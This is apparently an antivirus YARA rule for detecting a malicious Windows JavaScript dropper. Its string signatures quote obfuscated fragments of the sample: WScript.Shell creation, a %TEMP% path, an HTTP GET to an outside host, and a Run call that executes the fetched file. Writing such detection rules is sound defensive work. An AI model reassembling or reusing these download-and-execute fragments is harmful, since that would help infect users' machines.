rule sig_20160427_a079ffd48c4fd4c4c90f709233acc222 {
  meta:
    description = "datamaliciousorder - file 20160427_a079ffd48c4fd4c4c90f709233acc222.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "90fef0bcae6f9d3967ec2b47de97f581f494d831dfe63ad4719a967e6cc6d76f"

  strings:
    $s1  = "function XkyvjXzrnc() {return IwdowWeuyz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QLbLo26" ascii
    $s2  = "function XkyvjXzrnc() {return IwdowWeuyz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"QLbLo26" ascii
    $s3  = "var IwdowWeuyz = function YgxjuPnujj() {return GtyhePqfkl[MkgcmUyurj](\"WScript\"+\".Shell\");}(), UafajHmuof = 11;" fullword ascii
    $s4  = "HpxscLhijp[SbecbSqrgl](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s5  = "var GtyhePqfkl = this[\"WScript\"];" fullword ascii
    $s6  = "if (HpxscLhijp[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function NtgilGnmyv(){return RguomXolhq + \"\";};" fullword ascii
    $s8  = "function KwedtMyxtv(QbzkwIhyxn, CapxbHacmh){BmiddMawak = BmiddMawak * 1; return QbzkwIhyxn - CapxbHacmh;};" fullword ascii
    $s9  = "function XjwwuBwixk() {return ((HwxooPuiny == true) && (HwxooPuiny == PnhrrGzoop)) ? 1 : BmiddMawak;};" fullword ascii
    $s10 = "}while (IwedyVgors);" fullword ascii
    $s11 = "PnhrrGzoop = true; " fullword ascii
    $s12 = "var PnhrrGzoop = false;" fullword ascii
    $s13 = "return KwedtMyxtv(UolknEszvt, YnhxoSqbwl);" fullword ascii
    $s14 = "function ApgsoCotdc(KewblNauik) {var DknqwZcdkx = (1, 2, 3, 4, 5, KewblNauik); return DknqwZcdkx;};" fullword ascii
    $s15 = "var HwxooPuiny = false;" fullword ascii
    $s16 = "function QfkafXcmld(LhoxjRgmzy){IwdowWeuyz[\"R\"+\"un\"](LhoxjRgmzy, BmiddMawak, BmiddMawak);};" fullword ascii
    $s17 = "HwxooPuiny = true; " fullword ascii
    $s18 = "function WmbfrTywey(){return MkgcmUyurj;};" fullword ascii
    $s19 = "function BrlugGlrqd(){return 23;};" fullword ascii
    $s20 = "var QevexBwhzo = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}